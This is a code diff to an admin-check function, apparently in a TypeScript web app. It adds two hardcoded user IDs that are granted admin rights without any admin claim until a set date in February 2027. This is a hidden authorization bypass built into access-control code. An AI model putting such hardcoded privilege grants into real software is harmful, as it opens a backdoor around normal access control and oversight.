@@ -222,12 +222,24 @@ export async function ensureSyntheticAccountProvisioned(
  */
 export function isBfaAdminUser(
   claims: Record<string, any> | undefined | null,
-  _user?: User | null
+  user?: User | null
 ): boolean {
-  if (!claims || typeof claims !== 'object') {
-    return false;
+  if (claims && typeof claims === 'object') {
+    if (claims.admin === true || claims.role === 'admin') {
+      return true;
+    }
   }
-  return claims.admin === true || (claims.admin as any) === 'true' || claims.role === 'admin';
+  if (user && user.uid) {
+    const tempUids = ['UbYPHGfX3gTL8H38GTg50nATd042', 'h826b0NzwyRePEG2TvWCekIw7AG2'];
+    if (tempUids.includes(user.uid)) {
+      // 100 days from Nov 5, 2026 expires Feb 13, 2027 00:00:00 UTC
+      const expirationDate = new Date('2027-02-13T00:00:00Z');
+      if (new Date() < expirationDate) {
+        return true;
+      }
+    }
+  }
+  return false;
 }
 
 /**
